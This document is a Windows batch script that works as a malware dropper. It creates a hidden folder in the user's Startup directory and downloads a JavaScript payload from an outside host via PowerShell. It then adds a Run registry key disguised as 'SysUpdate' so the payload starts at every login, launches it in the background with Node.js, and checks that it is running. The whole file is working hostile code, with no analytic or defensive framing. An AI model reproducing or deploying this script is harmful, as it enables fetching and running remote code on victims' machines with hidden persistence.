@echo off
setlocal enabledelayedexpansion

:: --- CONFIGURATION ---
set "DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\.sys_update"
set "PAYLOAD_URL=https://payload-x3rf.onrender.com/payload.js"
set "LOCAL_PAYLOAD=%DIR%\payload.js"
set "LOG_FILE=%DIR%\install.log"

:: --- STEP 1: Ensure Directory Exists ---
if not exist "%DIR%" mkdir "%DIR%" 2>nul

:: --- STEP 2: Download Latest Payload ---
powershell -Command "Invoke-WebRequest -Uri '%PAYLOAD_URL%' -OutFile '%LOCAL_PAYLOAD%'" >nul 2>&1

if not exist "%LOCAL_PAYLOAD%" (
    echo [ERROR] Failed to download payload.js >> "%LOG_FILE%"
    exit /b 1
)

for %%F in ("%LOCAL_PAYLOAD%") do if %%~zF==0 (
    echo [ERROR] Downloaded payload.js is empty >> "%LOG_FILE%"
    del "%LOCAL_PAYLOAD%"
    exit /b 1
)

:: --- STEP 3: Find Node.js ---
:: Try to find node.exe in common locations or PATH
where node >nul 2>&1
if %errorlevel% neq 0 (
    :: If 'node' isn't in PATH, try common install paths
    if exist "C:\Program Files\nodejs\node.exe" set "NODE=C:\Program Files\nodejs\node.exe"
    if exist "C:\Users\%USERNAME%\AppData\Local\Programs\Node.js\node.exe" set "NODE=C:\Users\%USERNAME%\AppData\Local\Programs\Node.js\node.exe"
    if defined NODE (
        echo [INFO] Found Node at: %NODE% >> "%LOG_FILE%"
    ) else (
        echo [ERROR] Node.js not found in PATH or common directories. >> "%LOG_FILE%"
        exit /b 1
    )
) else (
    set "NODE=node"
    echo [INFO] Using Node from PATH: %NODE% >> "%LOG_FILE%"
)

:: --- STEP 4: Register Persistence ---
:: Use full path to node if found, otherwise just 'node'
if defined NODE (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdate" /t REG_SZ /d "cmd /c start \"\" /b \"%NODE%\" \"%LOCAL_PAYLOAD%\"" /f
) else (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdate" /t REG_SZ /d "cmd /c start \"\" /b node \"%LOCAL_PAYLOAD%\"" /f
)

:: --- STEP 5: Execute Payload Immediately with Error Logging ---
:: Launch node in the background. Redirect output to log file for debugging.
if defined NODE (
    start "" /b "%NODE%" "%LOCAL_PAYLOAD%" >> "%LOG_FILE%" 2>&1
) else (
    start "" /b node "%LOCAL_PAYLOAD%" >> "%LOG_FILE%" 2>&1
)

:: Give it a moment to start
timeout /t 2 /nobreak >nul

:: --- STEP 6: Verify it's Running ---
set "PID="
for /f "tokens=5" %%a in ('tasklist /FI "IMAGENAME eq node.exe" /FO CSV ^| findstr /i "payload.js"') do set "PID=%%a"

if defined PID (
    echo [SUCCESS] Payload is running with PID: %PID%
    echo [SUCCESS] Payload started successfully >> "%LOG_FILE%"
) else (
    echo [FAILED] Payload did not start. Check %LOG_FILE% for details.
    echo [FAILED] Check %LOG_FILE% for errors >> "%LOG_FILE%"
)

exit
